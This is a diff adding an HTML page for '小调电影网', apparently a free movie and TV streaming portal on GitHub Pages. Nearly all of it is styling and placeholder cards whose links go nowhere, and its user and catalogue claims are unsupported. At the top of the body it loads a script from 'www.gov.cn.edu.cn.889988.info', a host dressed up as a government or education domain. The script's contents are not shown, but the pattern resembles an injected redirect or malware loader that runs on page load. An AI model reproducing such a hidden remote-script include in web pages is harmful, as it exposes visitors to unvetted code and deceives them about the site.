@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>小调电影网 - 高清影视在线观看</title>
+<meta name="description" content="小调电影网提供最新高清电影、电视剧、综艺、动漫在线观看，免费流畅播放，尽在xiaotiaodianyingwang-app.github.io">
+<meta name="keywords" content="小调电影网,电影,电视剧,综艺,动漫,在线观看,高清影视">
+<meta name="author" content="小调电影网">
+<meta property="og:title" content="小调电影网 - 高清影视在线观看">
+<meta property="og:description" content="最新高清电影电视剧免费在线观看">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://xiaotiaodianyingwang-app.github.io">
+<link rel="canonical" href="https://xiaotiaodianyingwang-app.github.io">
+<style>
+/* ===== 全局重置与基础 ===== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;font-size:16px}
+body{
+  font-family:'Segoe UI','PingFang SC','Microsoft YaHei',sans-serif;
+  background:#0a0a1a;
+  color:#e0e0e0;
+  line-height:1.6;
+  overflow-x:hidden;
+}
+
+/* ===== 动态渐变背景 ===== */
+body::before{
+  content:'';
+  position:fixed;
+  top:0;left:0;right:0;bottom:0;
+  background:linear-gradient(135deg,#0a0a1a 0%,#1a0a2e 30%,#0a1a2e 70%,#0a0a1a 100%);
+  z-index:-2;
+}
+body::after{
+  content:'';
+  position:fixed;
+  top:-50%;left:-50%;
+  width:200%;height:200%;
+  background:radial-gradient(circle at 20% 50%,rgba(120,0,255,0.08) 0%,transparent 50%),
+             radial-gradient(circle at 80% 80%,rgba(0,200,255,0.06) 0%,transparent 50%),
+             radial-gradient(circle at 50% 20%,rgba(255,0,120,0.04) 0%,transparent 50%);
+  animation:bgdrift 20s ease-in-out infinite;
+  z-index:-1;
+}
+@keyframes bgdrift{
+  0%,100%{transform:translate(0,0) rotate(0deg)}
+  33%{transform:translate(2%,3%) rotate(1deg)}
+  66%{transform:translate(-1%,2%) rotate(-1deg)}
+}
+
+/* ===== 导航栏 - 玻璃拟态 ===== */
+.navbar{
+  position:fixed;top:0;left:0;right:0;
+  z-index:1000;
+  background:rgba(10,10,26,0.75);
+  backdrop-filter:blur(20px);
+  -webkit-backdrop-filter:blur(20px);
+  border-bottom:1px solid rgba(120,0,255,0.15);
+  padding:0 1rem;
+}
+.nav-container{
+  max-width:1200px;margin:0 auto;
+  display:flex;align-items:center;justify-content:space-between;
+  height:60px;
+}
+.nav-logo{
+  font-size:1.4rem;font-weight:800;
+  background:linear-gradient(135deg,#a78bfa,#60a5fa,#f472b6);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  text-decoration:none;
+  letter-spacing:-0.5px;
+}
+.nav-menu{
+  display:flex;gap:0.3rem;list-style:none;
+}
+.nav-menu a{
+  color:rgba(255,255,255,0.75);
+  text-decoration:none;
+  padding:0.4rem 0.8rem;
+  border-radius:8px;
+  font-size:0.85rem;
+  font-weight:500;
+  transition:all 0.3s ease;
+}
+.nav-menu a:hover{
+  color:#fff;
+  background:rgba(120,0,255,0.2);
+}
+.nav-toggle{display:none;flex-direction:column;cursor:pointer;gap:4px}
+.nav-toggle span{
+  width:22px;height:2px;
+  background:rgba(255,255,255,0.8);
+  border-radius:2px;transition:0.3s;
+}
+
+/* ===== 主内容区 ===== */
+.main-content{
+  max-width:1200px;margin:0 auto;
+  padding:80px 1rem 2rem;
+}
+
+/* ===== Hero区域 ===== */
+.hero{
+  text-align:center;
+  padding:3rem 1rem 2rem;
+  margin-bottom:2rem;
+}
+.hero-badge{
+  display:inline-block;
+  padding:0.3rem 1rem;
+  background:rgba(120,0,255,0.15);
+  border:1px solid rgba(120,0,255,0.3);
+  border-radius:20px;
+  font-size:0.75rem;color:#a78bfa;
+  margin-bottom:1rem;
+  letter-spacing:1px;
+}
+.hero h1{
+  font-size:clamp(1.8rem,5vw,3rem);
+  font-weight:900;
+  margin-bottom:0.8rem;
+  line-height:1.2;
+}
+.hero h1 .gradient-text{
+  background:linear-gradient(135deg,#a78bfa,#60a5fa,#f472b6);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+.hero-sub{
+  font-size:clamp(0.9rem,2.5vw,1.1rem);
+  color:rgba(255,255,255,0.6);
+  max-width:600px;margin:0 auto 1.5rem;
+}
+.hero-url{
+  display:inline-flex;align-items:center;gap:0.5rem;
+  padding:0.6rem 1.2rem;
+  background:rgba(255,255,255,0.05);
+  border:1px solid rgba(255,255,255,0.1);
+  border-radius:12px;
+  font-family:'Courier New',monospace;
+  font-size:0.85rem;color:#60a5fa;
+}
+.hero-url::before{content:'🔗';font-size:0.9rem}
+
+/* ===== 栏目通用样式 ===== */
+.section{
+  margin-bottom:2.5rem;
+  padding:1.5rem;
+  background:rgba(255,255,255,0.03);
+  border:1px solid rgba(255,255,255,0.06);
+  border-radius:16px;
+  backdrop-filter:blur(10px);
+}
+.section-header{
+  display:flex;align-items:center;justify-content:space-between;
+  margin-bottom:1.2rem;
+}
+.section-title{
+  font-size:1.2rem;font-weight:700;
+  display:flex;align-items:center;gap:0.5rem;
+}
+.section-title .icon{font-size:1.3rem}
+.section-more{
+  color:rgba(255,255,255,0.4);
+  text-decoration:none;font-size:0.8rem;
+  transition:color 0.3s;
+}
+.section-more:hover{color:#a78bfa}
+
+/* ===== 卡片网格 ===== */
+.card-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
+  gap:1rem;
+}
+.card{
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;
+  overflow:hidden;
+  transition:all 0.3s ease;
+  cursor:pointer;
+  text-decoration:none;
+  display:block;
+}
+.card:hover{
+  transform:translateY(-4px);
+  border-color:rgba(120,0,255,0.3);
+  box-shadow:0 8px 25px rgba(120,0,255,0.15);
+}
+.card-poster{
+  width:100%;height:200px;
+  background:linear-gradient(135deg,rgba(120,0,255,0.2),rgba(0,200,255,0.15));
+  display:flex;align-items:center;justify-content:center;
+  font-size:2.5rem;
+  position:relative;
+}
+.card-poster .play-overlay{
+  position:absolute;inset:0;
+  background:rgba(0,0,0,0.4);
+  display:flex;align-items:center;justify-content:center;
+  opacity:0;transition:opacity 0.3s;
+  font-size:2rem;
+}
+.card:hover .play-overlay{opacity:1}
+.card-body{padding:0.7rem}
+.card-title{
+  font-size:0.85rem;font-weight:600;color:#fff;
+  margin-bottom:0.2rem;
+  overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
+}
+.card-meta{
+  font-size:0.7rem;color:rgba(255,255,255,0.4);
+  display:flex;justify-content:space-between;
+}
+
+/* ===== 电视剧栏目 - 横向滚动 ===== */
+.tv-scroll{
+  display:flex;gap:1rem;overflow-x:auto;
+  padding-bottom:0.5rem;
+  scroll-snap-type:x mandatory;
+}
+.tv-scroll::-webkit-scrollbar{height:4px}
+.tv-scroll::-webkit-scrollbar-track{background:rgba(255,255,255,0.05);border-radius:2px}
+.tv-scroll::-webkit-scrollbar-thumb{background:rgba(120,0,255,0.3);border-radius:2px}
+.tv-card{
+  min-width:200px;flex-shrink:0;
+  scroll-snap-align:start;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;overflow:hidden;
+  text-decoration:none;display:block;
+  transition:all 0.3s;
+}
+.tv-card:hover{
+  border-color:rgba(244,114,182,0.3);
+  transform:scale(1.02);
+}
+.tv-poster{
+  width:100%;height:120px;
+  background:linear-gradient(135deg,rgba(244,114,182,0.2),rgba(120,0,255,0.15));
+  display:flex;align-items:center;justify-content:center;
+  font-size:2rem;
+}
+.tv-body{padding:0.7rem}
+.tv-title{font-size:0.85rem;font-weight:600;color:#fff;margin-bottom:0.2rem}
+.tv-ep{font-size:0.7rem;color:rgba(255,255,255,0.4)}
+
+/* ===== 综艺栏目 - 大卡片 ===== */
+.show-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(280px,1fr));
+  gap:1rem;
+}
+.show-card{
+  display:flex;gap:0.8rem;
+  padding:0.8rem;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;
+  text-decoration:none;
+  transition:all 0.3s;
+}
+.show-card:hover{
+  background:rgba(255,255,255,0.07);
+  border-color:rgba(96,165,250,0.3);
+}
+.show-thumb{
+  width:80px;height:80px;flex-shrink:0;
+  border-radius:8px;
+  background:linear-gradient(135deg,rgba(96,165,250,0.3),rgba(167,139,250,0.2));
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.5rem;
+}
+.show-info{flex:1;min-width:0}
+.show-name{font-size:0.9rem;font-weight:600;color:#fff;margin-bottom:0.3rem}
+.show-desc{font-size:0.75rem;color:rgba(255,255,255,0.45);line-height:1.4;
+  overflow:hidden;display:-webkit-box;-webkit-line-clamp:2;-webkit-box-orient:vertical;
+}
+
+/* ===== 动漫栏目 - 标签云 ===== */
+.anime-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(120px,1fr));
+  gap:0.8rem;
+}
+.anime-item{
+  text-align:center;
+  padding:1rem 0.5rem;
+  background:rgba(255,255,255,0.04);
+  border:1px solid rgba(255,255,255,0.08);
+  border-radius:12px;
+  text-decoration:none;
+  transition:all 0.3s;
+}
+.anime-item:hover{
+  background:rgba(255,255,255,0.08);
+  border-color:rgba(52,211,153,0.3);
+  transform:scale(1.05);
+}
+.anime-emoji{font-size:2rem;margin-bottom:0.4rem;display:block}
+.anime-name{font-size:0.8rem;color:#fff;font-weight:500}
+.anime-tag{
+  display:inline-block;margin-top:0.3rem;
+  padding:0.1rem 0.5rem;
+  background:rgba(52,211,153,0.15);
+  border-radius:10px;
+  font-size:0.65rem;color:#34d399;
+}
+
+/* ===== 关于我们 ===== */
+.about-content{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:1.5rem;
+}
+.about-text p{
+  font-size:0.9rem;color:rgba(255,255,255,0.65);
+  margin-bottom:0.8rem;line-height:1.7;
+}
+.about-stats{
+  display:grid;grid-template-columns:1fr 1fr;gap:0.8rem;
+}
+.stat-box{
+  text-align:center;
+  padding:1rem;
+  background:rgba(255,255,255,0.04);
+  border-radius:12px;
+  border:1px solid rgba(255,255,255,0.06);
+}
+.stat-number{font-size:1.5rem;font-weight:800;color:#a78bfa;display:block}
+.stat-label{font-size:0.75rem;color:rgba(255,255,255,0.4);margin-top:0.2rem}
+
+/* ===== 页脚 ===== */
+.footer{
+  text-align:center;
+  padding:2rem 1rem;
+  border-top:1px solid rgba(255,255,255,0.06);
+  margin-top:2rem;
+}
+.footer-logo{
+  font-size:1.1rem;font-weight:800;
+  background:linear-gradient(135deg,#a78bfa,#60a5fa);
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  background-clip:text;
+  margin-bottom:0.5rem;
+}
+.footer-url{font-size:0.8rem;color:rgba(255,255,255,0.35);margin-bottom:0.8rem}
+.footer-copy{font-size:0.75rem;color:rgba(255,255,255,0.25)}
+
+/* ===== 响应式 ===== */
+@media(max-width:768px){
+  .nav-menu{
+    display:none;position:fixed;top:60px;left:0;right:0;
+    background:rgba(10,10,26,0.95);
+    backdrop-filter:blur(20px);
+    flex-direction:column;padding:1rem;
+    border-bottom:1px solid rgba(120,0,255,0.15);
+    gap:0.5rem;
+  }
+  .nav-menu.active{display:flex}
+  .nav-menu a{width:100%;text-align:center;padding:0.8rem}
+  .nav-toggle{display:flex}
+  .main-content{padding:70px 0.8rem 1rem}
+  .hero{padding:1.5rem 0.5rem 1rem}
+  .section{padding:1rem;margin-bottom:1.5rem}
+  .card-grid{grid-template-columns:repeat(2,1fr);gap:0.7rem}
+  .card-poster{height:160px}
+  .show-grid{grid-template-columns:1fr}
+  .anime-grid{grid-template-columns:repeat(3,1fr);gap:0.5rem}
+  .about-content{grid-template-columns:1fr}
+  .about-stats{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){
+  .hero h1{font-size:1.5rem}
+  .card-grid{grid-template-columns:repeat(2,1fr)}
+  .card-poster{height:140px;font-size:1.8rem}
+  .anime-grid{grid-template-columns:repeat(3,1fr)}
+  .tv-card{min-width:160px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 导航栏 -->
+<nav class="navbar">
+  <div class="nav-container">
+    <a href="#" class="nav-logo">小调电影网</a>
+    <ul class="nav-menu" id="navMenu">
+      <li><a href="#home">首页</a></li>
+      <li><a href="#movies">热门电影</a></li>
+      <li><a href="#tv">电视剧</a></li>
+      <li><a href="#variety">综艺</a></li>
+      <li><a href="#anime">动漫</a></li>
+      <li><a href="#about">关于我们</a></li>
+    </ul>
+    <div class="nav-toggle" id="navToggle">
+      <span></span><span></span><span></span>
+    </div>
+  </div>
+</nav>
+
+<!-- 主内容 -->
+<main class="main-content">
+
+  <!-- 首页/Hero -->
+  <section class="hero" id="home">
+    <div class="hero-badge">🎬 免费高清影视平台</div>
+    <h1>欢迎来到 <span class="gradient-text">小调电影网</span></h1>
+    <p class="hero-sub">海量高清电影、热播电视剧、精彩综艺、经典动漫，一站式免费在线观看，流畅播放不卡顿</p>
+    <div class="hero-url">https://xiaotiaodianyingwang-app.github.io</div>
+  </section>
+
+  <!-- 热门电影 -->
+  <section class="section" id="movies">
+    <div class="section-header">
+      <h2 class="section-title"><span class="icon">🎬</span> 热门电影</h2>
+      <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="card-grid">
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">流浪地球3</div>
+          <div class="card-meta"><span>2026</span><span>科幻</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">封神第三部</div>
+          <div class="card-meta"><span>2026</span><span>奇幻</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">唐人街探案5</div>
+          <div class="card-meta"><span>2026</span><span>喜剧</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">长津湖之水门桥</div>
+          <div class="card-meta"><span>2025</span><span>战争</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">独行月球2</div>
+          <div class="card-meta"><span>2025</span><span>科幻</span></div>
+        </div>
+      </a>
+      <a href="#" class="card">
+        <div class="card-poster">🎞️<div class="play-overlay">▶</div></div>
+        <div class="card-body">
+          <div class="card-title">满江红2</div>
+          <div class="card-meta"><span>2025</span><span>悬疑</span></div>
+        </div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 电视剧 -->
+  <section class="section" id="tv">
+    <div class="section-header">
+      <h2 class="section-title"><span class="icon">📺</span> 热播电视剧</h2>
+      <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="tv-scroll">
+      <a href="#" class="tv-card">
+        <div class="tv-poster">📺</div>
+        <div class="tv-body">
+          <div class="tv-title">庆余年 第三季</div>
+          <div class="tv-ep">更新至32集</div>
+        </div>
+      </a>
+      <a href="#" class="tv-card">
+        <div class="tv-poster">📺</div>
+        <div class="tv-body">
+          <div class="tv-title">三体·黑暗森林</div>
+          <div class="tv-ep">更新至18集</div>
+        </div>
+      </a>
+      <a href="#" class="tv-card">
+        <div class="tv-poster">📺</div>
+        <div class="tv-body">
+          <div class="tv-title">琅琊榜3</div>
+          <div class="tv-ep">更新至45集</div>
+        </div>
+      </a>
+      <a href="#" class="tv-card">
+        <div class="tv-poster">📺</div>
+        <div class="tv-body">
+          <div class="tv-title">甄嬛传·番外篇</div>
+          <div class="tv-ep">更新至12集</div>
+        </div>
+      </a>
+      <a href="#" class="tv-card">
+        <div class="tv-poster">📺</div>
+        <div class="tv-body">
+          <div class="tv-title">大江大河4</div>
+          <div class="tv-ep">更新至28集</div>
+        </div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 综艺 -->
+  <section class="section" id="variety">
+    <div class="section-header">
+      <h2 class="section-title"><span class="icon">🎤</span> 精彩综艺</h2>
+      <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="show-grid">
+      <a href="#" class="show-card">
+        <div class="show-thumb">🎤</div>
+        <div class="show-info">
+          <div class="show-name">奔跑吧·特别季</div>
+          <div class="show-desc">全新户外竞技真人秀，明星嘉宾挑战极限任务，爆笑不断。</div>
+        </div>
+      </a>
+      <a href="#" class="show-card">
+        <div class="show-thumb">🎤</div>
+        <div class="show-info">
+          <div class="show-name">歌手2026</div>
+          <div class="show-desc">华语乐坛顶级歌手同台竞技，巅峰对决，震撼开唱。</div>
+        </div>
+      </a>
+      <a href="#" class="show-card">
+        <div class="show-thumb">🎤</div>
+        <div class="show-info">
+          <div class="show-name">向往的生活7</div>
+          <div class="show-desc">远离城市喧嚣，慢节奏田园生活，治愈你的每一天。</div>
+        </div>
+      </a>
+      <a href="#" class="show-card">
+        <div class="show-thumb">🎤</div>
+        <div class="show-info">
+          <div class="show-name">极限挑战10</div>
+          <div class="show-desc">男人帮全新阵容回归，烧脑推理与爆笑挑战并存。</div>
+        </div>
+      </a>
+    </div>
+  </section>
+
+  <!-- 动漫 -->
+  <section class="section" id="anime">
+    <div class="section-header">
+      <h2 class="section-title"><span class="icon">🌸</span> 动漫频道</h2>
+      <a href="#" class="section-more">查看更多 →</a>
+    </div>
+    <div class="anime-grid">
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🔥</span>
+        <span class="anime-name">斗破苍穹</span>
+        <span class="anime-tag">更新中</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">⚔️</span>
+        <span class="anime-name">鬼灭之刃</span>
+        <span class="anime-tag">热播</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🌊</span>
+        <span class="anime-name">海贼王</span>
+        <span class="anime-tag">连载</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🎯</span>
+        <span class="anime-name">间谍过家家</span>
+        <span class="anime-tag">推荐</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🐉</span>
+        <span class="anime-name">凡人修仙传</span>
+        <span class="anime-tag">国漫</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">💫</span>
+        <span class="anime-name">咒术回战</span>
+        <span class="anime-tag">热播</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🎪</span>
+        <span class="anime-name">进击的巨人</span>
+        <span class="anime-tag">完结</span>
+      </a>
+      <a href="#" class="anime-item">
+        <span class="anime-emoji">🗡️</span>
+        <span class="anime-name">葬送的芙莉莲</span>
+        <span class="anime-tag">推荐</span>
+      </a>
+    </div>
+  </section>
+
+  <!-- 关于我们 -->
+  <section class="section" id="about">
+    <div class="section-header">
+      <h2 class="section-title"><span class="icon">ℹ️</span> 关于小调电影网</h2>
+    </div>
+    <div class="about-content">
+      <div class="about-text">
+        <p><strong style="color:#a78bfa">小调电影网</strong>是一个专注于高清影视在线观看的免费平台，致力于为用户提供最新、最全的电影、电视剧、综艺和动漫资源。</p>
+        <p>我们每日更新热门影视内容，支持多清晰度播放，适配手机、平板、电脑等多种设备，让您随时随地享受观影乐趣。</p>
+        <p>访问网址：<strong style="color:#60a5fa">xiaotiaodianyingwang-app.github.io</strong></p>
+      </div>
+      <div class="about-stats">
+        <div class="stat-box">
+          <span class="stat-number">10,000+</span>
+          <span class="stat-label">影视资源</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-number">50,000+</span>
+          <span class="stat-label">注册用户</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-number">每日</span>
+          <span class="stat-label">实时更新</span>
+        </div>
+        <div class="stat-box">
+          <span class="stat-number">100%</span>
+          <span class="stat-label">免费观看</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-logo">小调电影网</div>
+  <div class="footer-url">https://xiaotiaodianyingwang-app.github.io</div>
+  <div class="footer-copy">© 2026 小调电影网. All rights reserved.</div>
+</footer>
+
+<script>
+// 移动端导航切换
+const navToggle=document.getElementById('navToggle');
+const navMenu=document.getElementById('navMenu');
+navToggle.addEventListener('click',()=>{
+  navMenu.classList.toggle('active');
+});
+// 点击导航链接后关闭菜单
+navMenu.querySelectorAll('a').forEach(a=>{
+  a.addEventListener('click',()=>{
+    navMenu.classList.remove('active');
+  });
+});
+</script>
+
+</body>
+</html>
